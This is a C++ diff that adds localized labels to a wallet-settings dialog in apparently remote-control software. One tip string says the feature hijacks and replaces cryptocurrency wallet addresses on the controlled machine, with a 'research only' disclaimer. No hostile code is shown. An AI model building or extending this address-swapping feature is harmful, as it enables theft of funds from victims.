@@ -48,6 +48,19 @@ END_MESSAGE_MAP()
 BOOL CWalletDlg::OnInitDialog()
 {
     __super::OnInitDialog();
+    // 多语言翻译 - Static控件
+    SetDlgItemText(IDC_STATIC_WALLET_BTC, _TR("比特币 (BTC):"));
+    SetDlgItemText(IDC_STATIC_WALLET_ETHERC20_2394, _TR("ETH-ERC20:"));
+    SetDlgItemText(IDC_STATIC_WALLET_USDTOMNI_2395, _TR("USDT-OMNI:"));
+    SetDlgItemText(IDC_STATIC_WALLET_USDTTRC20_2396, _TR("USDT-TRC20:"));
+    SetDlgItemText(IDC_STATIC_WALLET_TRON_2397, _TR("TRON:"));
+    SetDlgItemText(IDC_STATIC_WALLET_Polkadot_2398, _TR("Polkadot:"));
+    SetDlgItemText(IDC_STATIC_WALLET_ADA_2399, _TR("ADA:"));
+    SetDlgItemText(IDC_STATIC_WALLET_Dogecoin_2400, _TR("Dogecoin:"));
+    SetDlgItemText(IDC_STATIC_WALLET_XRP_2401, _TR("XRP:"));
+    SetDlgItemText(IDC_STATIC_WALLET_Solana_2402, _TR("Solana:"));
+    SetDlgItemText(IDC_STATIC_WALLET_TIP, _TR("提示信息: 劫持并替换被控端钱包地址；总字符数最多是470，只填写所需的地址，不需要全部填满。"));
+    SetDlgItemText(IDC_STATIC_WALLET_WARNING, _TR("警告信息: 此功能仅用于开源项目之研究，用户自行承担后果，不得用于非法目的。"));
 
     auto a = StringToVector(m_str.GetString(), ';', MAX_WALLET_NUM);
     m_EditBTC.SetWindowTextA(a[ADDR_BTC].c_str());
